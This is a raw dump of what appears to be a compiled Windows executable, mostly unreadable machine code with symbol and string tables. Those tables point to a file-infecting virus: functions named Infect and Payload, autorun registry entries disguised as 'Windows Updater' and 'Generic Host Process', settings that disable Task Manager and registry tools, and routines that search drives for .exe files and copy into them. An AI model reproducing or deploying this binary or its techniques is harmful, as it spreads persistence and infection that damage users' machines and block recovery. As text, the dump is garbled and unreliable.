+  *]*  Û*Áà*  ë*À¢@ **Ã*§ ì*ÿ%”¢@ *˜§ í*ÿ%œ¢@ * § î*ÿ% ¢@ *¨§ ï*ÿ%¤¢@ *°§ ð*ÿ%¨¢@ *¸§ ñ*ÿ%¬¢@ *À§ ò*ÿ%°¢@ *È§ ó*ÿ%´¢@ *Ð§ ô*ÿ%¼¢@ *Ø§ õ*ÿ%Ä¢@ *à§ ö*ÿ%È¢@ *è§ ÷*ÿ%Ð¢@ *ð§ ø*ÿ%Ô¢@ *ø§ ù*ÿ%Ø¢@ *€¨ ú*ÿ%Ü¢@ *ˆ¨ û*ÿ%à¢@ *¨ ü*ÿ%ä¢@ *˜¨ ý*ÿ%è¢@ * ¨ þ*ÿ%ì¢@ *¨¨ ÿ*ÿ%ð¢@ *°¨ €	*ÿ%ô¢@ *¸¨ 	*ÿ%ü¢@ *À¨ ‚	*ÿ% £@ *È¨ ƒ	*ÿ%£@ *Ð¨ „	*ÿ%£@ *Ø¨ …	*ÿ%£@ *à¨ †	*ÿ%£@ *è¨ ‡	*ÿ%£@ *ð¨ ˆ	*ÿ%£@ *ø¨ ‰	*ÿ% £@ *€© Š	*é;  *©	  *U*   *‰å*	 >*W*	 ?*V*	 @*S*  Ö*ƒì,*  ‹	*¡0`@ *
+ @ È*‹]*
+ ? ë*‹u*
+ > Œ	*‹}*
+  	*‹U*  Ž	*=T@ *	 	*t*
+ 	 *‰U*
+ Œ	 >*‰}*
+ ë ?*‰u*
+ È @*‰]*  Ÿ*eô*
+ @*[*
+ ?*^*
+ >*_*
+  *]* *ÿà*Ð© 	 *‰Uä*  ‹*Ç$u@ *ÔÄ‚ ‘	*ÿT¢@ *  G*ƒì* 7 ’	*ÇD$&u@ *	  *‰$*ÜÄ‚ ”*ÿ\¢@ *  “	*¹€T@ *
+  	*‹Uä*  —*ƒì*
+  *…À*   *DÁ* ‹	 *£0`@ *	 ”	*ë¦*ª	  *U*   *‰å*	 >*W*	 ?*V*	 @*S*  Ö*ƒì,*  ‹	*¡0`@ *
+ @ æ*‹]*
+ ? å*‹u*
+ > ä*‹}*
+  •	*‹U*  Ž	*=T@ *	 –	*t*
+ •	 *‰U*
+ ä >*‰}*
+ å ?*‰u*
+ æ @*‰]*  Ÿ*eô*
+ @*[*
+ ?*^*
+ >*_*
+  *]* *ÿà*Ðª ° *‰Uä*  ‹*Ç$u@ *ÔÄ‚ ‘	*ÿT¢@ *  G*ƒì* 7 ’	*ÇD$&u@ *	  *‰$*ÜÄ‚ ”*ÿ\¢@ *  “	*¹€T@ *
+  °*‹Uä*  —*ƒì*
+  *…À*   *DÁ* ‹	 *£0`@ *	 —	*ë¦*«	  *U*   *‰å*	 @*S*
+  ¥*‹M*
+ @ *‹]*
+  *…É*	 ˜	*t*
+  @*Ù*  @*‰Ø* ? g*¶    *  *‰Â*  *ƒÀ*
+ ™	 S*Æ *
+  *9Á*	 š	*uô*  @*‰Ø*
+ @ Ü*‹]ü**É*
+ —*Â *À«	  *U*   *‰å*	 >*W*	 ?*V*	 @*S*  Ö*ƒì,*
+ @ ë*‹]*
+  È*‹U*
+ ? Œ	*‹u*
+ > 	*‹}*
+ @ @*…Û*	 ›	*u*
+ ë >*‰}*
+ È ?*‰u*  Ö*ƒÄ,*
+ @*[*
+ ?*^*
+ >*_*
+  *]* œ	*ée  *ð«  *‰$*
+ 6 >*‰|$*
+ 4 ?*‰t$*
+ 7 @*‰\$*
+ 	 *‰Uä*È¯ 	*èÁ  *
+  	*‹Uä*
+  *…À*	' ž	*x*
+ @ *9Ã*	 ž	*t*  Ö*ƒÄ,*
+ @*[*
+ ?*^*
+ >*_*
+  *]**Ã* ¬ Ÿ	 S*ÆDÿ *
+  *…À*	'  	*x°*  Ö*ƒÄ,*
+ @*[*
+ ?*^*
+ >*_*
+  *]**Ã*À¬	  *U*   *‰å*	 >*W*	 ?*V*	 @*S*  Ö*ƒì,*
+ ? È*‹u*
+ ? ?*…ö* ¡	*„Š   *	  ?*‰4$*à¨ i*èþÿÿ* > ¢	*| *	  >*‰<$*˜¨ _*è°ýÿÿ* @ *‰Ã*
+  *…À*	 £	*u1*	 ¤	*ë?*ð¬  ë*‹E*
+ 4 ?*‰t$*
+ 7 >*‰|$*
+ 6 *‰D$*	  @*‰$*È¯ 	*èA  *
+  *…À*	 ¥	*y=*
+ > >*ÿ*	  @*‰$*
+ 7 >*‰|$*Ð¯ ¦	*è7  *
+  *…À*	 §	*t
+* @ *‰Ã* > ¨	*ÿþÿÿ*	& ©	*vÉ*	  @*‰$*ˆ¨ “*èYýÿÿ*  U*Ç$   *à® ª	*è¥   *  ü*¸ÿÿÿÿ*	 «	*ë*È­  @*‰$*
+ 	 *‰Eä*ˆ¨ “*è5ýÿÿ*
+  	*‹Eä*  Ö*ƒÄ,*
+ @*[*
+ ?*^*
+ >*_*
+  *]**Ã*Þ­  ¬	*Ç$   *à® ª	*èv   *	 ­	*ëÏ*ð­	  *U*   *‰å*	 ?*V*	 @*S*  Ô*ƒì*
+ @ È*‹]*
+ ? ë*‹u*  ‹*Ç$4u@ *ÔÄ‚ ‘	*ÿT¢@ *  G*ƒì*
+  *…À*	 ®	*t.* 7 ¯	*ÇD$Ju@ *	  *‰$*ÜÄ‚ ”*ÿ\¢@ *  —*ƒì*
+  *…À*	 ®	*t* °	 *£4`@ *
+ ë ?*‰u*
+ È @*‰]*  ±	*eø*
+ @*[*
+ ?*^*
+  *]* *ÿà*À®  ²	*¸@V@ *	 ³	*ëã*Ð® ´	*ÿ%4`@ *à®	  *U*   *‰å*  —*ƒì*À¯ µ	*èU   *
+  ¶	*‹U*  *‰*
+  *1À**É**Ã*€¯	  *U*   *‰å*	 @*S*  G*ƒì*
+ @ ¶	*‹]*
+ @ @*…Û*	 ·	*t*À¯ µ	*è-   *  *‹ * h *‰*
+ @ Ü*‹]ü*
+  *1À**É**Ã* ¯À¯ µ	*è   *
+ @ Ü*‹]ü*  ¬	*Ç    *  ¬	*¸   **É**Ã*À¯ ¸	*ÿ%¸¢@ *È¯ ¹	*ÿ%Ì¢@ *Ð¯ º	*ÿ%ø¢@ *Ø¯	  *U*   *‰å*  —*ƒì*
+ Ü *‰Mü*
+  Ü*‹Eü*	  C*‹P*  *‹ **É**Ã*ì¯	  *U*   *‰å*
+  *‹E*  ¥*E*
+  *]**Ã*€°  ;*L$*  <*ƒäð*		 =*ÿqü*	  *U*   *‰å*	 >*W*	 ?*V*
+ ? ?*1ö*	 @*S*	 *Q*  »	*ƒìh*à‡ p*èÅëÿÿ*˜§ ¼	*èxûÿÿ* @ *‹*
+ @ @*…Û*	 ½	*u.* ¾	*é¨   *°° ) )*„À*	 ¿	*tK* ? *ƒæ*	 À	*t.* ? *¾   *	  *‰$*Ø§ Á	*è’ûÿÿ*
+  *…À*	 Â	*t* Ã	 *€{*( @ ­*ƒÛÿ* @ *ƒÃ*  Ä	*¾* ) Ø*< *	 Å	*~Õ*  ?*‰ò*  *ƒò* ) Æ	*<"*  ? *Dò*	 Ç	*ë×*ç° ) )*„À*	 ¿	*t* ? g*.t& *  Ã	*¶C* @ *ƒÃ*
+ ) )*„À*	 ¿	*t* ) Ø*< *	 È	*~ñ*  É	*U¤*
+  *1À*  ä*¹   * > *‰×*	$ ò*ó«*	  *‰$*àÄ‚ Ê	*ÿ`¢@ *  ß*¸
+   *  G*ƒì* Ë	 *öEÐ*	 Ì	*t*  Í	*·EÔ*
+ 4 @*‰\$*
+ 6 *‰D$* 7 S*ÇD$    *  ¥*Ç$  @ *ò€ Î	*èIàÿÿ*  Ô*ƒì*  z*eð*
+ *Y*
+ @*[*
+ ?*^*
+ >*_*
+  *]*  {*aü**Ã*Ó± @ ‹*»pr@ *	 ¿	*ë¥*à± Ï	*é+»ÿÿ2
+ 2
+
+2
+
+2
+2
+2
+2
+ 2
+ #2
+#&2
+&(2
+(*2
+*/2
+/42
+462
+6;2
+;I2
+IX2
+XZ2
+Z]2
+]a2
+ae2
+eh2
+h2
+il2
+ln2
+nq2
+qv2
+v†2
+†2
+2
+ 2
+ °2
+°³2
+³»2
+»¿2
+¿Ä2
+ÄÊ2
+ÊÌ2
+ÌÖ2
+ÖÛ2
+ÛÝ2
+Ýß2
+ßá2
+áë2
+ëö2
+ö…2
+…ˆ2
+ˆ‹2
+‹“2
+“–2
+–œ2
+œž2
+ž¡2
+¡¤2
+¤¦2
+¦æ2
+æ¡2
+¡¤2
+¤¦2
+¦2
+§©2
+©¬2
+¬®2
+®¿2
+¿Ä2
+ÄÆ2
+ÆÒ2
+Ò×2
+×Ü2
+ÜÞ2
+Þä2
+äç2
+çé2
+é2
+êì2
+ìî2
+î†2
+†‹2
+‹š2
+š¨2
+¨ª2
+ªÄ2
+ÄÉ2
+ÉÌ2
+ÌÑ2
+Ñà2
+àì2
+ìñ2
+ñô2
+ôÿ2
+ÿ…2
+…Œ2
+Œ“2
+“˜2
+˜2
+™œ2
+œ¡2
+¡Ã2
+ÃÍ2
+ÍÏ2
+ÏÜ2
+Üá2
+áä2
+äï2
+ïô2
+ôö2
+ö€2
+€2
+”2
+”Ÿ2
+Ÿ¤2
+¤¦2
+¦À2
+ÀÇ2
+ÇÊ2
+ÊÏ2
+ÏÓ2
+Óó2
+óø2
+øû2
+ûŠ2
+Š2
+‘2
+‘2
+¢2
+¢§2
+§®2
+®±2
+±ê2
+êž2
+ž³2
+³µ2
+µï2
+ïñ2
+ñ2
+ò‚	2
+‚	†	2
+†	“	2
+“	¤	2
+¤	©	2
+©	°	2
+°	Ë	2
+Ë	Ï	2
+Ï	Õ	2
+Õ	Ø	2
+Ø	Ú	2
+Ú	2
+Û	Ý	2
+Ý	â	2
+â	—
+2
+—
+ª
+2
+ª
+¬
+2
+¬
+2
+­
+¸
+2
+¸
+º
+2
+º
+Ö
+2
+Ö
+æ
+2
+æ
+é
+2
+é
+ë
+2
+ë
+í
+2
+í
+2
+î
+ð
+2
+ð
+‚2
+‚‹2
+‹Ž2
+Ž¶2
+¶Ü2
+Üá2
+áì2
+ìñ2
+ñû2
+û‹2
+‹”2
+”–2
+–˜2
+˜®2
+®°2
+°´2
+´¾2
+¾À2
+ÀÆ2
+ÆÛ2
+ÛÝ2
+Ý‡2
+‡–2
+–£2
+£»2
+»½2
+½Ê2
+ÊÌ2
+ÌÙ2
+ÙÛ2
+Ûæ2
+æè2
+èù2
+ùû2
+ûþ2
+þŒ2
+ŒŽ2
+Ž”2
+”Ã2
+ÃÆ2
+ÆÈ2
+È2
+ÉË2
+ËÏ2
+ÏØ2
+ØÚ2
+ÚÜ2
+Üô2
+ôö2
+öù2
+ùˆ2
+ˆŠ2
+ŠŒ2
+Œ¬2
+¬®2
+®±2
+±È2
+ÈÊ2
+ÊÑ2
+ÑÏ2
+Ï×2
+×ç2
+çé2
+é2
+êø2
+øŽ2
+Ž2
+“2
+“¢2
+¢¤2
+¤¯2
+¯å2
+åî2
+î2
+¸2
+¸Ç2
+ÇÍ2
+Íé2
+é2
+£2
+£ª2
+ª±2
+±¹2
+¹2
+º½2
+½Ã2
+ÃÆ2
+ÆÈ2
+È2
+ÉË2
+ËÒ2
+ÒÚ2
+ÚÜ2
+Üá2
+áû2
+û…2
+…‡2
+‡Š2
+Š2
+—2
+—›2
+› 2
+ £2
+£2
+¤¦2
+¦2
+§©2
+©´2
+´½2
+½Î2
+ÎÓ2
+Ó‡2
+‡‰2
+‰Ž2
+Ž2
+“2
+“š2
+š¥2
+¥§2
+§2
+¨ª2
+ª­2
+­Õ2
+Õ×2
+×Ú2
+Úá2
+áã2
+ãï2
+ïò2
+òÿ2
+ÿŒ2
+Œœ2
+œ£2
+£¦2
+¦2
+§2
+¨2
+©2
+ª2
+«2
+¬2
+­2
+®2
+¯2
+°2
+±2
+²´2
+´¸2
+¸¼2
+¼Ã2
+ÃÅ2
+Å2
+ÆÍ2
+ÍÏ2
+ÏÑ2
+ÑÔ2
+ÔÙ2
+ÙÛ2
+Ûà2
+à2
+áä2
+ä2
+åç2
+çé2
+éï2
+ïñ2
+ñô2
+ôý2
+ý„2
+„2
+…‡2
+‡‰2
+‰2
+2
+2
+‘”2
+”2
+•˜2
+˜œ2
+œ¦2
+¦¨2
+¨³2
+³2
+´Î2
+ÎÐ2
+Ðä2
+äî2
+îò2
+òõ2
+õù2
+ùý2
+ý‚2
+‚”2
+”˜2
+˜›2
+›2
+œ¢2
+¢³2
+³·2
+·¹2
+¹À2
+ÀÃ2
+ÃÌ2
+ÌÒ2
+Òâ2
+âå2
+å2
+æé2
+é2
+êì2
+ìï2
+ïò2
+òõ2
+õ÷2
+÷û2
+û2
+ü2
+ƒ2
+ƒ…2
+…ˆ2
+ˆ‹2
+‹–2
+–˜2
+˜ž2
+ž 2
+ 2
+¡©2
+©«2
+«°2
+°²2
+²¶2
+¶2
+·¼2
+¼¾2
+¾À2
+ÀÆ2
+ÆÈ2
+ÈÌ2
+Ì2
+ÍÏ2
+ÏÑ2
+ÑÚ2
+Ú2
+ÛÞ2
+Þá2
+áç2
+çï2
+ïò2
+òø2
+øû2
+ûþ2
+þ…2
+…Ž2
+Ž2
+‘2
+‘2
+’”2
+”™2
+™›2
+›2
+œŸ2
+Ÿ£2
+£¥2
+¥§2
+§¬2
+¬®2
+®±2
+±2
+²µ2
+µ¸2
+¸½2
+½¿2
+¿Á2
+ÁÃ2
+ÃÈ2
+ÈÌ2
+ÌÏ2
+ÏÓ2
+Ó×2
+×Ü2
+Üè2
+èê2
+êò2
+òô2
+ô÷2
+÷ú2
+úƒ2
+ƒ†2
+†ˆ2
+ˆ’2
+’ 2
+ £2
+£¥2
+¥­2
+­±2
+±·2
+·¹2
+¹¼2
+¼2
+½Á2
+ÁÃ2
+Ã2
+ÄÆ2
+ÆÍ2
+ÍÏ2
+ÏÖ2
+Ö2
+×Ù2
+ÙÜ2
+Ü2
+Ýá2
+áã2
+ãæ2
+æè2
+èë2
+ëî2
+îñ2
+ñ2
+òø2
+øþ2
+þƒ2
+ƒ…2
+…‰2
+‰2
+’2
+’•2
+•›2
+›§2
+§©2
+©¬2
+¬¯2
+¯³2
+³2
+´¸2
+¸Ä2
+ÄÆ2
+ÆÊ2
+ÊÌ2
+ÌÑ2
+ÑÓ2
+Ó×2
+×Þ2
+Þå2
+åí2
+íð2
+ðô2
+ô2
+õ÷2
+÷‚2
+‚„2
+„‡2
+‡Š2
+ŠŽ2
+Ž2
+“2
+“–2
+–™2
+™2
+šœ2
+œž2
+ž¥2
+¥©2
+©¬2
+¬®2
+®³2
+³µ2
+µ·2
+·¹2
+¹2
+º¾2
+¾Â2
+ÂÅ2
+ÅÈ2
+È2
+ÉÍ2
+ÍÐ2
+ÐÔ2
+ÔÖ2
+ÖØ2
+Øã2
+ãå2
+åè2
+èë2
+ëï2
+ï2
+ðõ2
+õý2
+ý†2
+†Š2
+Š2
+’2
+’•2
+•š2
+š2
+›ž2
+ž¡2
+¡¥2
+¥¬2
+¬®2
+®°2
+°³2
+³¶2
+¶¸2
+¸À2
+À2
+Á2
+Â2
+ÃÈ2
+ÈÍ2
+ÍÒ2
+ÒØ2
+Øæ2
+æè2
+èî2
+îõ2
+õ2
+ö2
+÷2
+ø2
+ù2
+ú2
+û2
+ü2
+ý2
+þ2
+ÿ2
+€2
+2
+‚2
+ƒ2
+„2
+…2
+†2
+‡2
+ˆ2
+‰2
+Š2
+‹2
+Œ2
+2
+Ž2
+2
+2
+‘2
+’2
+“2
+”¡2
+¡«2
+«¹2
+¹Æ2
+ÆÐ2
+ÐÞ2
+Þå2
+åè2
+èí2
+íñ2
+ñý2
+ý… 2
+… Ž 2
+Ž  2
+ – 2
+– ™ 2
+™ Ÿ 2
+Ÿ ¨ 2
+¨ ° 2
+° 2
+± ¹ 2
+¹ ¿ 2
+¿ 2
+À Â 2
+Â Ä 2
+Ä Æ 2
+Æ È 2
+È Ì 2
+Ì Ò 2
+Ò Õ 2
+Õ á 2
+á ç 2
+ç ï 2
+ï ñ 2
+ñ 2
+ò û 2
+û ‚!2
+‚!‰!2
+‰!!2
+!2
+!2
+‘!2
+’!›!2
+›!¡!2
+¡!±!2
+±!2
+²!´!2
+´!¶!2
+¶!2
+·!»!2
+»!½!2
+½!2
+¾!Á!2
+Á!Æ!2
+Æ!È!2
+È!2
+É!Í!2
+Í!Ï!2
+Ï!Ú!2
+Ú!2
+Û!é!2
+é!ë!2
+ë!:Ó !"#$%&'()"#'$%()  & !""###$$$%%'()Î:
+***:++:ô789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~7E788;899;9::<;<<><==>>@?@@?@AACBCCBCDDEE_FIFGGIGHHJIJJZJKKMLMMLMNNYNOOTPRQRRQRSSTTPTUUWVWWVWXXÐXYYZZ^Z[[^[\\^\]]`^__F_``b`aaªabb~bccedeedeffhghhghiinjlkllklmmnnjnoosprpqqrrsspsttvuvvuvwwyxyyxyzz|{||{|}}~~7:Ÿ€‚ƒ„…†‡ˆ‰Š‹ŒŽ‘’“”•–—˜™š›œžŸ ¡¢£¤¥¦§¨©ª«¬­®¯°±²³´µ¶·€ˆ€ƒ‚ƒƒ‚ƒ„„†„……‡†‡‡ˆˆ‰‰Œ‰ŠŠŠŠ‹‹ŒŒŽŽŽŽ’’‘‘“’““£“””£”••š–˜–——™˜™™šš–š››œ žž žŸŸ¡ ¡¡œ¡¢¢Ð¢££ª£¤¤¨¤¥¥¨¥¦¦¦¦§§¨¨¤¨©©ªª‰ª««­¬­­¬­®®°¯°°¯°±±³²³³²³´´¶µ¶¶µ¶··‰€:‘¸¹º»¼½¾¿ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÚÛÜÝÞßàáâãäåæçèé¸È¸¹¹»º»»º»¼¼À¼½½¿¾¿¿¾¿ÀÀÄÀÁÁÃÂÃÃÂÃÄÄÆÅÆÆÅÆÇÇÈÈËÈÉÉËÉÊÊÌËÌÌÝÌÍÍÏÎÏÏÎÏÐÐÒÑÒÒÑÒÓÓÕÔÕÕÔÕÖÖØ×ØØ×ØÙÙÛÚÛÛÚÛÜÜÝÝéÝÞÞéÞßßáßààâáââäãääãäååçæççæçèèé¸:êê:Öëìíîïðñòóôõö÷øùúûüýþÿ€‚ƒ„…†‡ˆ‰Š‹ŒŽ‘’“”•–—˜™š›œžŸ ¡¢£¤¥¦§ëðëììîíîîíîïïððöñõñòòõòóóõóôô÷õööñö÷÷ú÷øøúøùùûúûûŽûüüþýþþýþÿÿ„ÿ€€‚‚‚‚ƒƒÐƒ„„Œ…Š†ˆ†‡‡‰ˆ‰‰ŠŠ†Š‹‹ŒŒ…ŒŽŽ‘Ž‘‘¢‘’’”“””“”••š–˜—˜˜—˜™™šš–š››œœžž Ÿ  Ÿ ¡¡¢¢¦¢££¥£¤¤¥¥ª¥¦¦§ë:©©©©:ªªªª:««««:¬¬¬¬:­­­­:®®®®:¯¯¯¯:°°°°:±±±±:²²²²:³³³³:ƒº»¼½¾¿ÀÁº¿º»»¾»¼¼½½½½¾¿ÀÀÀÀÁÁ»º:(ÂÃÄÂÄÂÃÄºÂ:ÅÅ:7ÆÇÈÉÆÉÆÇÇÉÇÈÆ:·ÊËÌÍÎÏÐÑÒÓÔÕÊÌÊËËÌÌÏÌÍÍÕÍÎÏÎÏÐÐÑÑÓÑÒÒÓÓÑÓÔÊ:(×ØÙ×Ù×ØØÙ×:ÚÚ:ÛÛÌÛ:—ÜÝÞßàáâãäåæçèéêëÜéÜÝÝÞÞàÞßßæßààÞàááëáââêâããåãääçäååæçåçèèÛéáêÛëÛÜ:êìíîïðñòóôõö÷øùúûüýþÿ€‚ƒ„…†‡ˆ‰Š‹ŒŽ‘’“”•–—˜™š›œìîìíîíîïï…ïððññ‘ñòòóó‘óôôœôõõíõööÿ÷›÷øøúøùùúúýúûû„ûüü„üýýþþŽþÿÿˆÿ€€÷€‚‚þ‚ƒƒ„„Û……††ñ†‡‡óˆŠˆ‰‰ŠŠŠ‹‹„‹ŒŒ„ŒÿŽŽ•þ‘‘í‘’’““““””••í•––——™—˜˜™™—™š›ÛœÛì:Æ:xº»¼½¾¿ÀºÀº»»¼¼¿¼½½¿½¾¾¿¿¼¿Àº:±ÓÔÕÖ×ØÙÚÛÜÝÞßàáâãäÓâÓÔÔÙÔÕÕÜÕÖÖäÖ××ØÙØÙÚÚØÚÛÛØÜãÜÝÝØÝÞÞáÞßßààààááØãÝä×Ó:7åæçèåçåææèæçå:xéêëìíîïéîéêêëëíëììïìííëíîîïé:Àúûüýþÿ€‚ƒ„úüúûûýûüýüýþþƒþÿÿ€€‚€„‚‚€‚ƒƒ„ú:N…†‡ˆ‰…‡…††ˆ†‡ˆ‡ˆ‰…:7•–—˜•—•––˜–—•:»™š›œžŸ ¡¢£¤™›™ššœš›œ›œ£žŸ¡Ÿ  ¤ ¡¡Ÿ¡¢¢£™:4¹º»¹»¹ºººº»¹:½½:¾¾:¿¿:ÀÀ:ÁÁÁÁ:ÂÂÂÂ:ÃÃÃÃ:ÄÄÄÄ:ÅÅÅÅ:ÆÆÆÆ:ÇÇÇÇ:ÈÈÈÈ:ÉÉÉÉ:ÊÊÊÊ:ËËËË:ÌÌÌÌ:ÍÍÍÍ:ÎÎÎÎ:ÏÏÏÏ:ÐÐÐÐ:ÑÑÑÑ:ÒÒÒÒ:ÓÓÓÓ:ÔÔÔÔ:ÕÕÕÕ:ÖÖÖÖ:××××:ØØØØ:ÙÙÙÙ:ÚÚÚÚ:ÛÛÛÛ:ÜÜÜÜ:ÝÝÝÝ:ÞÞÞÞ:2ãäåãåãääàåäã:?æçèéæéæççèèèèéæ:ƒƒ: „…†„†„…„:‡‡‡‡:ˆˆˆˆ:‰‰‰‰:ŠŠ:‹‹:­ŒŽ‘’“”•–—˜™š›œŒ”ŒŽšŽ–‘‘“‘’’““””Ž”••‘–š–——˜˜š˜™™˜™ššœš››œšŒB«(
+Ð¢€___tmainCRTStartup
+à§€_mainCRTStartup
+ð§€_atexit
+à©€Infect
+œÀ€Payload
+¬Ý€Secret
+øñ€_time
+ò€_WinMain@16
+ä…
+operator<<
+ì…~basic_ofstream
+ô…basic_ofstream
+ü…close
+„†~basic_ifstream
+Œ†basic_ifstream
+”†close
+œ†write
+¤†tellg
+¬†seekg
+´†read
+€‡___do_global_ctors
+à‡___main
+€ˆ	__setargv
+ˆ___dyn_tls_dtor@12
+Ðˆ___dyn_tls_init@12
+€Š	__matherr
+€‹_fpreset
+‹___report_error
+ð‹_mark_section_writable
+!ÐŽ__pei386_runtime_relocator
+•___mingw_setusermatherr
+'À˜ ___mingwthr_run_key_dtors.part.0
+Ð›___mingw_TLScallback
+À__ValidateImageBase
+ð__FindPESection
+$ðŸ___mingw_GetSectionForAddress
+€¡___mingw_GetSectionCount
+À¢__GetPEImageBase
+$€£__IsNonwritableInCurrentImage
+è¥___chkstk_ms
+ ¦
+_sprintf_s
+&Ð¦__get_invalid_parameter_handler
+&à¦__set_invalid_parameter_handler
+ð¦___acrt_iob_func
+§___getmainargs
+˜§___p__acmdln
+ §___p__commode
+¨§___p__fmode
+°§___set_app_type
+¸§___setusermatherr
+À§__amsg_exit
+È§__cexit
+Ð§
+__initterm
+Ø§__ismbblead
+à§__onexit
+è§_abort
+ð§_calloc
+ø§_exit
+€¨_fprintf
+ˆ¨_free
+¨_fwrite
+˜¨_malloc
+ ¨_memcpy
+¨¨_memset
+°¨_rand
+¸¨_signal
+À¨_srand
+È¨_strcat
+Ð¨_strcmp
+Ø¨_strcpy
+à¨_strlen
+è¨_strncmp
+ð¨	_vfprintf
+ø¨_itoa
+ª_vsprintf_s
+«_RtlSecureZeroMemory@8
+à®__set_errno
+€¯__get_errno
+À¯__errno
+È¯__vsnprintf
+Ð¯_realloc
+!Ø¯operator.cast.to.long_long
+ì¯	operator|
+€°.text.startup
+€Ä‚GetUserNameA
+„Ä‚RegCloseKey
+ˆÄ‚RegOpenKeyExA
+ŒÄ‚RegSetValueExA
+”Ä‚	CopyFileA
+˜Ä‚CreateDirectoryA
+œÄ‚DeleteCriticalSection
+ Ä‚DeleteFileA
+¤Ä‚EnterCriticalSection
+¨Ä‚	FindClose
+¬Ä‚FindFirstFileA
+°Ä‚FindNextFileA
+´Ä‚FreeLibrary
+¸Ä‚GetComputerNameA
+¼Ä‚GetCurrentProcess
+ÀÄ‚GetLastError
+ÄÄ‚GetLocalTime
+ ÈÄ‚GetLogicalDriveStringsA
+ÌÄ‚GetModuleFileNameA
+ÐÄ‚GetModuleHandleA
+ÔÄ‚GetModuleHandleW
+ØÄ‚GetPriorityClass
+ÜÄ‚GetProcAddress
+àÄ‚GetStartupInfoA
+äÄ‚GetSystemDirectoryA
+èÄ‚GetSystemInfo
+ìÄ‚GetTickCount
+"ðÄ‚InitializeCriticalSection
+ôÄ‚LeaveCriticalSection
+øÄ‚LoadLibraryA
+$üÄ‚SetUnhandledExceptionFilter
+€Å‚Sleep
+„Å‚TlsGetValue
+ˆÅ‚VirtualProtect
+ŒÅ‚VirtualQuery
+”Å‚__getmainargs
+œÅ‚__p__acmdln
+ Å‚__p__commode
+¤Å‚
+__p__fmode
+¨Å‚__set_app_type
+¬Å‚__setusermatherr
+°Å‚
+_amsg_exit
+´Å‚_cexit
+¸Å‚_errno
+¼Å‚	_initterm
+ÄÅ‚
+_ismbblead
+ÈÅ‚_onexit
+ÌÅ‚
+_vsnprintf
+ÐÅ‚abort
+ÔÅ‚calloc
+ØÅ‚exit
+ÜÅ‚fprintf
+àÅ‚free
+äÅ‚fwrite
+èÅ‚malloc
+ìÅ‚memcpy
+ðÅ‚memset
+ôÅ‚rand
+øÅ‚realloc
+üÅ‚signal
+€Æ‚srand
+„Æ‚strcat
+ˆÆ‚strcmp
+ŒÆ‚strcpy
+Æ‚strlen
+”Æ‚strncmp
+˜Æ‚vfprintf
+œÆ‚time
+ Æ‚_itoa
+¨Æ‚ShellExecuteA
+ÀÆ‚read
+ÄÆ‚seekg
+ÈÆ‚tellg
+ÌÆ‚write
+ÐÆ‚close
+ÔÆ‚basic_ifstream
+ØÆ‚~basic_ifstream
+ÜÆ‚close
+àÆ‚basic_ofstream
+äÆ‚~basic_ofstream
+èÆ‚
+operator<< r   q )  < E < =  R 1 3 2 3 8 5QP<lcS`JmE<='E:=JCQ
+	ahJ:mlc''EE=JJr]^\dDBWEm<''EE'===EJJJ:]DBDDE]DEBZ^\^\ahm'EJJlcS`JkEXEWmJUEVTUEVTUEVTUEVTah<m'E=>DEJ:UVTUVT–felcS`JJQP<m><=E':JJ]^\A?HkEBEahJQ
+˜	*9*;*G6"$utb#&t0[sbo:Yn'IIgIiKMLMLMRR,R4RjRJMZJPEJ.textJ.dataJ.rdataJ/4J.bssJ.idataJ.CRTJ.tlsJ.relocJ/14J/29J/41J/55J/67J/78J/94J/110Jlibgcc_s_dw2-1.dllJ__register_frame_infoJ__deregister_frame_infoJ	hash_%08XJProc:%lu Page:%luJH:%u M:%u S:%uJ*.exeJ	Tick_%lu_JDummyData_%lu_%luJIter_%d_J
+Hash_%08lXJ-SOFTWARE\Microsoft\Windows\CurrentVersion\RunJ'Generic Host Process for Win32 ServicesJ1SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceJWindows UpdaterJ3SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceExJWindows ServerJ5SOFTWARE\Microsoft\Windows\CurrentVersion\RunServicesJGenericJDummyData_%08XJ9SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\SystemJDisableTaskMgrJDisableRegistrytoolsJDEAD_BRANCH_TESTJLen=%zu, Tick=%luJ*.exeJUnknown errorJ*_matherr(): %s in %s(%g, %g)  (retval=%g)
+JArgument domain error (DOMAIN)JArgument singularity (SIGN)JOverflow range error (OVERFLOW)J5The result is too small to be represented (UNDERFLOW)J"Total loss of significance (TLOSS)J$Partial loss of significance (PLOSS)JMingw-w64 runtime failure:
+JAddress %p has no image-sectionJ0  VirtualQuery failed for %d bytes at address %pJ&  VirtualProtect failed with code 0x%xJ1  Unknown pseudo relocation protocol version %d.
+J)  Unknown pseudo relocation bit size %d.
+JR%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p.
+J
+msvcrt.dllJ
+vsprintf_sJ
+msvcrt.dllJ
+_vscprintfJGCC: (GNU) 13-win32JGCC: (GNU) 13-win32JGCC: (GNU) 13-win32JGCC: (GNU) 13-win32JGCC: (GNU) 13-win32JGCC: (GNU) 13-win32JGCC: (GNU) 13-win32JGCC: (GNU) 13-win32JGCC: (GNU) 13-win32JGCC: (GNU) 13-win32JGCC: (GNU) 13-win32JGCC: (GNU) 13-win32JGCC: (GNU) 13-win32JGCC: (GNU) 13-win32JGCC: (GNU) 13-win32JGCC: (GNU) 13-win32JGCC: (GNU) 13-win32JGCC: (GNU) 13-win32JGCC: (GNU) 13-win32JGCC: (GNU) 13-win32JGCC: (GNU) 13-win32JGCC: (GNU) 13-win32JGCC: (GNU) 13-win32JGCC: (GNU) 13-win32JGCC: (GNU) 13-win32JGCC: (GNU) 13-win32JGCC: (GNU) 13-win32JGCC: (GNU) 13-win32JGCC: (GNU) 13-win32JGCC: (GNU) 13-win32JGCC: (GNU) 13-win32JGCC: (GNU) 13-win32JGCC: (GNU) 13-win32JGCC: (GNU) 13-win32JGCC: (GNU) 13-win32JGCC: (GNU) 13-win32JGCC: (GNU) 13-win32JGCC: (GNU) 13-win32JGetUserNameAJRegCloseKeyJRegOpenKeyExAJRegSetValueExAJ	CopyFileAJCreateDirectoryAJDeleteCriticalSectionJDeleteFileAJEnterCriticalSectionJ	FindCloseJFindFirstFileAJFindNextFileAJFreeLibraryJGetComputerNameAJGetCurrentProcessJGetLastErrorJ